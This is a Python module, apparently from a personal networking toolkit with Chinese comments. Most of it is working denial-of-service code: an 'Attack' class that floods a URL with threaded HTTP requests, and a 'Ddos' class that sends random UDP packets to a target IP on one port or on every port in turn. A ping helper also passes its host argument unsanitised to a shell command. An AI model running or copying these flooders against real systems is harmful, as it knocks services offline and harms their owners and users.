import os,socket,threading,requests,meo,random

headers = {
    "User-Agent": meo.net.UserAgent.FIREFOX
}

#本机信息
from .hostinfo import Hostinfo

def ping(host:str) -> str:
    """ping"""
    return os.popen("ping "+ host).read()

def getip(name:str):
    """通过`域名`获取`ip`"""
    try:
        return socket.gethostbyname(name)
    except:
        return None



class Attack:
    """洪水攻击"""
    def _attack(self):
        for i in range(self.speed):
            try:
                r = requests.get(self.url, self.headers)
                self.collector['success'] += 1
            except:
                # 发送失败
                self.collector['err'] += self.speed - i
                break
    def _attackRun(self):
        while self.start:
            t = threading.Thread(target=self._attack, args=())
            t.start()
    def run(self):
        """开始攻击"""
        self.start = True
        t = threading.Thread(target=self._attackRun, args=())
        t.start()
    def stop(self):
        """停止攻击"""
        self.start = False
    def __init__(self, url:str, speed:int, headers=headers):
        self.url = url
        self.speed = speed
        self.headers = headers
        self.collector = {
            "success": 0,
            "err": 0,
        }


class Ddos:
    """攻击"""
    def _allRun(self):
        """泛洪攻击"""
        self.data['port'] = self.port
        while self.start:
            if self.data['port'] > 65535:
                self.data['port'] = 1
            self.sock.sendto(self.bytes, (self.ip,self.data['port']))
            self.data['sent'] += 1
            self.data['port'] += 1
    def all(self):
        """启动泛洪攻击"""
        self.start = True
        t = threading.Thread(target=self._allRun, args=())
        t.start()
    def _oneRun(self):
        """洪攻击"""
        self.rport = self.port
        while self.start:
            self.sock.sendto(self.bytes, (self.ip,self.port))
            self.data['sent'] += 1
    def one(self):
        """启动洪攻击"""
        self.start = True
        t = threading.Thread(target=self._oneRun, args=())
        t.start()
    def stop(self):
        """停止攻击"""
        self.start = False
    def __init__(self, ip:str, port:int = 1):
        self.sent = 0
        self.ip = ip
        self.port = port
        self.data = {
            "sent": 0,
            "port": 0,
        }
        #初始化数据包
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.bytes = random._urandom(1490)



if __name__ == "__main__":
    print(ping('8.8.8.8'))